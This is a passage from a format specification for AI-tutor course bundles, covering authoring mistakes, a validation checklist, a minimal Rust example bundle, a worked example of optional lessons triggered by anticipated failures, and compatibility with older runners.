19. **Putting `offer_because` in the lesson instead of the manifest.** The tutor would
    have to open every optional lesson every turn to know what it could offer, which is
    the cost the format exists to avoid.
20. **Giving an optional lesson a number prefix.** It has no position in the order.
21. **Writing `repair_in` as the way back.** It names whose work is wrong, not where the
    learner stands. The way back is recorded in the instance when the detour starts.
22. **Recording in the bundle that a learner deferred something.** An offer and a
    deferral are progress. They belong in the instance's `STATE.md`.
23. **Putting a concept in `assumes` and expecting it to stop anyone.** It stops nobody.
    It is shown to the learner, who decides. If a later lesson genuinely cannot be done
    without something, teach it on the main path.
24. **Naming a lesson file as a concept id.** A concept id names a technical concept, not
    a file: `partition-offsets`, never `04-offsets`. Another author's bundle quotes it.
25. **Writing a `because` for yourself instead of for the learner.** It is the sentence
    they read when deciding what to do next, and it is all they have to go on.
26. **Expecting a recommendation to install, order, unlock or require anything.** It is
    advisory. A referenced bundle need not even exist, and one that does not is not an
    error to be fixed.
27. **Renaming a concept id after publication.** Another author's `assumes` names it, and
    nothing coordinates the two. It is as stable as `id`.
28. **Replacing `subjects` with `covers`.** They answer different questions — broad
    browsing and precise concept matching — and both stay.
29. **Naming a foldered lesson's body anything but `LESSON.md`.** `index.md` and
    `README.md` are not recognised. `lesson.md` is worse than not recognised: macOS and
    Windows filesystems are case-insensitive, so it appears to work locally and then
    fails on Linux. Match the case exactly.

---

## 10. Self-check before you deliver

Confirm each of these by looking, not by remembering:

- [ ] `STATE.md` does **not** exist anywhere in the bundle
- [ ] `lessons.generated/` does **not** exist anywhere in the bundle
- [ ] no promoted lesson still carries `generated`, `generated_at`, `kind`, `reason` or
      `after` in its frontmatter
- [ ] `STATE.template.md` exists and describes a learner who has not started
- [ ] `tutorial.yaml`, `COURSE.md`, `DESIGN.md`, `lessons/` all exist
- [ ] every top-level field in `tutorial.yaml` is one the field reference lists — a key it
      does not list is a warning rather than a rejection, but it is almost always a
      misspelling, and the runner reads nothing by a name it does not know
- [ ] `teaching_method`, if the manifest declares it at all, holds a real sentence about
      how the course teaches — an empty value is a finding, not a default, and leaving the
      key out entirely is the correct way to say nothing
- [ ] every `lessons` entry resolves to a file that exists
- [ ] every lesson in `lessons/` is listed exactly once — in `lessons` **or** in
      `optional_lessons`, never in both — counting both top-level `.md` files and
      folders containing `LESSON.md`
- [ ] every folder directly under `lessons/` contains a `LESSON.md`
- [ ] every supporting file in a lesson folder is mentioned by its `LESSON.md`, unless a
      `supplies` entry covers it
- [ ] `STATE.template.md`'s `tutorial_id` equals `tutorial.yaml`'s `id`
- [ ] `STATE.template.md`'s `active_lesson` equals the first `lessons` entry
- [ ] every lesson file has `id` and `title` in frontmatter
- [ ] every `design_refs` entry resolves to a real anchor in `DESIGN.md`
- [ ] every lesson `validators` entry is declared in `tutorial.yaml`
- [ ] every `optional_lessons` key resolves to a lesson, and its `offer_at`,
      `repair_in` and `required_for` entries are all entries in `lessons`
- [ ] every `offer_at` is non-empty and every entry has an `offer_because`
- [ ] every `anticipates` id is declared in `failure_modes`, and every declared failure
      mode is anticipated by at least one optional lesson
- [ ] every `signals` entry of the form `validator:<name>` names a declared validator
- [ ] every lesson listed in `optional_lessons` declares `optional: true` in its
      frontmatter, and no main-path lesson declares it
- [ ] every `supplies` entry names a `from` that exists in the bundle, a `to` that
      lands outside `tutorial/`, and a `describe` a learner would understand
- [ ] every **lesson-scope** `supplies` entry names a `from` inside `lessons/`, because
      the instance carries nothing else — a lesson folder is the recommended home, not a
      requirement, and a single-file lesson may supply a loose file beside it
- [ ] every `covers` and `assumes` concept id matches `[a-z0-9-]+` and names a technical
      concept rather than a lesson file
- [ ] every `covers` and `assumes` concept carries a non-empty `summary`, and every
      `assumes` concept a `level` of `awareness`, `conceptual`, `working` or `advanced`
- [ ] every `assumes` summary is specific enough for a learner to self-assess against,
      and nothing in the course treats `assumes` as a gate
- [ ] every `covers` concept is recognisable in `COURSE.md` — in the coverage list, or by
      an alias naming it the way `COURSE.md` does
- [ ] every recommendation names a `bundle` id spelled as that bundle spells its own `id`,
      and a `because` written for the learner
- [ ] no recommendation names this bundle, and no bundle id appears twice in one list
- [ ] the course can be finished by a learner who declines every offer — with no
      exception, `required_for` included: a gate is on the failure, so the tutor clears it
      by coaching and the declining learner still finishes (section 13)
- [ ] neither `COURSE.md` nor any file under `lessons/` carries a progress marker in a
      structural position — a heading annotated with a status, a `Status:` label, a ticked
      checklist box, a bold `**Next:**` label, a "current lesson" or "resume marker"
      heading, or a status field in lesson frontmatter. Ordinary prose using those words
      is fine: "while the refactor is in progress" is teaching, not progress.
- [ ] every foldered lesson's body is named `LESSON.md` in exact case — confirm with a
      directory listing, because a case-insensitive filesystem will hide a mistake
- [ ] if `ownership_policy` is `on-request`, the lesson that needed the relaxation says
      what the tutor may create — naming the limit, not only the permission
- [ ] `workspace_kind` is one of the three permitted values
- [ ] no learner's source code appears anywhere in the bundle

A bundle that passes all of these is structurally valid. It does not mean the course is
good — that is your judgement, not the format's.

---

## 11. Minimal complete example

This is the smallest thing that is still a valid bundle. (The bundle shipped with the
runner at `examples/rust-cli-basics/` is a fuller worked example; this one is trimmed to
the bare minimum so the required shape is visible at a glance.)

```
tiny-cli-course/
├── tutorial.yaml
├── COURSE.md
├── DESIGN.md
├── STATE.template.md
└── lessons/
    └── 00-hello-args.md
```

`tutorial.yaml`:

```yaml
bundle_format: 1
id: tiny-cli-course
title: A Tiny CLI Course
description: Learn core Rust by building a small command-line tool.
subjects: [rust, cli]
aliases: [command-line, argv]
level: beginner
style: [project-driven, interactive]
lessons:
  - lessons/00-hello-args.md
workspace_kind: new-repository
tutor_owned:   [tutorial/STATE.md, tutorial/DESIGN.md]
learner_owned: [src/**, Cargo.toml]
ownership_policy: tutor-must-not-edit-learner-owned
validators:
  cargo-check: { kind: command, command: [cargo, check] }
  cargo-test:  { kind: command, command: [cargo, test] }
one_task_at_a_time: true
solution_code: on-request-only
advance_on: validated-evidence-only
```

`DESIGN.md`:

```markdown
# Design

## Argument model {#argument-model}

The tool takes a subcommand followed by zero or more positional arguments.
No flags in the first version; flags arrive once a subcommand needs one.
```

`lessons/00-hello-args.md`:

```markdown
---
id: 00-hello-args
title: Reading command-line arguments
design_refs: [argument-model]
validators: [cargo-check]
---

## Purpose

Get a Rust binary reading its own arguments, so later lessons have input to work with.

## Learning objectives

- Run a binary with `cargo run`
- Obtain the arguments from the environment
- Recognise that the first argument is the program name

## Completion conditions

`cargo check` passes, and running the binary with two arguments prints both,
excluding the program name.
```

`STATE.template.md` is required too, exactly as shown in section 5, with
`tutorial_id: tiny-cli-course` and `active_lesson: lessons/00-hello-args.md`.

That is a complete, valid bundle.

To make `00-hello-args` a foldered lesson instead, the only changes are:

```
lessons/
└── 00-hello-args/
    ├── LESSON.md          the same file, renamed
    └── sample-output.txt  material, mentioned by LESSON.md
```

```yaml
lessons:
  - lessons/00-hello-args/LESSON.md
```

The `id` stays `00-hello-args`, because the slug is now the folder name. Nothing else
changes.

---

## 12. Worked example: an optional lesson that anticipates a failure

A streaming course. Lesson 04 has the learner implement windowed aggregation. The author
knows what almost everyone writes first — a window keyed on the time the record arrived —
and knows what it costs two lessons later, when a delayed record turns up.

`tutorial.yaml`, the relevant parts only:

```yaml
lessons:
  - lessons/00-records-and-streams.md
  - lessons/04-window-execution.md
  - lessons/06-correctness-under-delay.md

validators:
  test-suite:  { kind: command, command: [pytest, -q] }
  late-events: { kind: command, command: [pytest, -q, tests/test_late_events.py] }

optional_lessons:
  lessons/event-time-and-watermarks.md:
    offer_at:      [lessons/04-window-execution.md]
    offer_because: >
      Windows keyed on arrival time put a delayed record in whichever window is
      open when it arrives, not the one it belongs to. There is a lesson on event
      time and watermarks whenever you want it.
    anticipates:   [late-event-wrong-window, window-never-closes]
    repair_in:     lessons/04-window-execution.md
    required_for:  [lessons/06-correctness-under-delay.md]

failure_modes:
  late-event-wrong-window:
    summary: >
      A record that arrives after its window closed is counted in whichever
      window is open when it arrives.
    signals: [validator:late-events, token:LATE_EVENT_MISBINNED, diagnosis]
  window-never-closes:
    summary: A window that receives no later record never emits its result.
    signals: [validator:test-suite, diagnosis]
```

`lessons/event-time-and-watermarks.md` is an ordinary lesson file with `optional: true` in
its frontmatter and no number prefix.

### Path 1 — the learner takes it when it is offered

1. Lesson 04 becomes the active lesson. Before its first task the tutor states the risk
   in the two sentences of `offer_because`, says the lesson is optional, and asks. It
   teaches no event time while offering; the offer is a warning and a question, not a
   lecture.
2. The learner says yes. `active_lesson` becomes `lessons/event-time-and-watermarks.md`
   and `resume_at` becomes `lessons/04-window-execution.md` — the lesson they were
   standing in. `STATE.md` records the optional lesson as `in-progress`.
3. The lesson is taught and its completion conditions are checked, like any lesson.
   `STATE.md` records it `complete`.
4. `active_lesson` goes back to `resume_at`, the `resume_at` field is removed, and lesson
   04 begins with the learner able to key a window on event time. `repair_in` names lesson
   04 as well, and there is nothing to repair, because nothing was built yet.

### Path 2 — the learner defers it, and the failure arrives

1. The same offer, at the same point.
2. The learner says "not now". `STATE.md` records the lesson `deferred`, at lesson 04,
   with the date. **The tutor does not raise it again** — not later in lesson 04, not at
   its end, not in lesson 05. Nothing new has happened, and saying it twice is nagging.
3. Lesson 04 completes on its own terms. The learner keyed the window on arrival time and
   every check lesson 04 declares passes, because none of them delays a record. That is
   not a defect in the course. It is what an anticipated failure looks like before it
   happens.
4. In lesson 06 the `late-events` validator fails, and its output carries
   `LATE_EVENT_MISBINNED`.
5. The tutor has evidence: a named validator failed, and a token appeared in its output.
   Both are `signals` of `late-event-wrong-window`. It reads the learner's window key,
   confirms the diagnosis, and now holds a failure mode rather than an error message.
6. `late-event-wrong-window` is in `anticipates` for a lesson `STATE.md` records as
   `deferred`. So the tutor says, in this order: what failed; what that means, in the
   words of `summary`; that this is the topic set aside at lesson 04; and that the lesson
   is available now. It reports the connection neutrally. It does not say "as I warned".
7. The learner accepts. `active_lesson` becomes the optional lesson and `resume_at`
   becomes `lessons/06-correctness-under-delay.md`, because that is where they are
   standing. **Not lesson 04** — `repair_in` is not the way back.
8. The lesson completes. `active_lesson` returns to lesson 06, and the first task there is
   the repair: rework the window assignment that lesson 04 built — which is what
   `repair_in` names — and re-run `late-events`.
9. `STATE.md` records the optional lesson `complete`. If a similar failure appears again
   it is now an ordinary failure and the tutor coaches. A completed optional lesson is
   never offered a second time.

### If the learner defers it again at step 7

That is allowed, and it is recorded. Because lesson 06 appears in `required_for`, the
tutor also says what the gate means: lesson 06 cannot be completed while this failure
stands. What the learner cannot do is finish lesson 06 with the failure in place.

**What happens next is ordinary coaching, and this is the part that is easy to get
wrong.** The tutor does not stop, does not re-offer, and does not wait for the learner to
change their mind. It teaches the repair inside lesson 06 — name the concept, hand back
one correction, let the learner rework the window assignment — and when `late-events`
passes, the failure has cleared and the gate opens. The learner finishes lesson 06 without
ever taking the optional lesson.

The optional lesson stays the better route: it teaches the model rather than patching one
symptom, and it stays available for as long as the learner wants it. It is never the only
route. A gate whose only exit were a lesson the learner refused twice would contradict the
invariant in section 13, and that is why the gate is on the failure rather than on the
lesson.

Without `required_for` the tutor would coach them through the failure in exactly the same
way, and simply advance past lesson 06 as well. The gate changes when the learner may
advance, never who may teach the repair. Reach for it only when the blocked lesson
genuinely cannot be finished with the failure in place.

---

## 13. Older runners, and bundles that predate this

`bundle_format` stays `1`. `optional_lessons`, `failure_modes`, `supplies`, `covers`,
`assumes`, `recommended_follow_ups`, `recommended_previous_bundles`,
`teaching_method` and `setup_validators` are all additive: a bundle written before this
section existed is valid exactly as it stands, nothing in this document changes what it means, and no edit
is implied. Run the validator over it and see.

The other direction is the one to understand before you ship a course that uses the
feature. A runner that predates it reads `tutorial.yaml`, does not recognise the new
keys, and ignores them. The effect on a learner is precise, and worth stating plainly:

- **every optional lesson is never offered.** The learner walks `lessons` and finishes the
  course without meeting one;
- **every `required_for` gate goes unenforced.** The learner is not stopped. They meet the
  failure, and the tutor coaches them through it as an ordinary failure;
- **no supplied file is placed.** The learner is told to put it there by hand, or the
  lesson fails to find it — which is the position every course that predates `supplies`
  is in already;
- **no `assumes` review is shown, and no recommendation is offered.** This is the cheapest
  of the four to lose: the learner starts the course and finishes it, exactly as they would
  have done, and simply never sees the two screens. Nothing was gating anything, so nothing
  is unlocked by their absence — which is the clearest statement of what the relationship
  keys are worth and what they are not;
- **no setup validator runs, and the disclosure block is never drawn.** An older runner
  does not recognise `setup_validators`, so it ignores the key: the setup guard the author
  wrote does not fire, and nothing tells the learner it was skipped. That is **degraded, not
  dangerous** — the check the course wanted is missing, and a missing check runs no program
  and hides nothing that was going to run. The failures it would have caught arrive later,
  in the lesson, where an ordinary validator sees them. It is the behaviour the
  degrade-rather-than-refuse rule is designed to produce, and an older validator reports
  the key as an unrecognised top-level field rather than rejecting the bundle;
- **no banner is drawn, and `teaching_method` is never shown.** An older runner opens the
  course in prose, the way every runner did before the banner existed. The learner loses
  the opening orientation and nothing else: the field is read at one moment, is shown at
  one moment, and gates nothing;
- **nothing is taught wrongly.** The main path is untouched by `optional_lessons`, because
  an optional lesson is never in it. An unplaced supply is not the same case — a
  manifest-scope entry IS on the main path — but it costs the learner the toil the key
  removes, not a wrong lesson, and it fails where they can see it rather than silently.

So the invariant that makes this safe is one you hold, and no validator can check it:

> **The course MUST be completable by a learner who declines every offer.**

That is worth insisting on for a reason beyond old runners: the old-runner case is
identical to a learner who says no to everything, and you have to support that learner
anyway.

**There is no exception, and `required_for` is not one.** The gate is on the failure, not
on the lesson, so a current runner clears it by coaching the repair inline and an old
runner never applies it at all. Both finish the course. The two runners differ only in
whether the learner is told the gate exists — never in whether they can reach the end.

Two things follow:

- **never put a concept the main path depends on into an optional lesson alone.** If a
  later main-path lesson cannot be completed without it, it belongs on the main path.
  `required_for` is for a mistake the learner has already made, never for a prerequisite;
- **an older copy of `validate_bundle.py` reports every optional lesson as unlisted.**
  That is a stale validator, not a defect in the bundle: the check it runs was written
  before `optional_lessons` existed. Update the validator rather than the bundle, and do
  not "fix" the finding by moving the lesson into `lessons`.

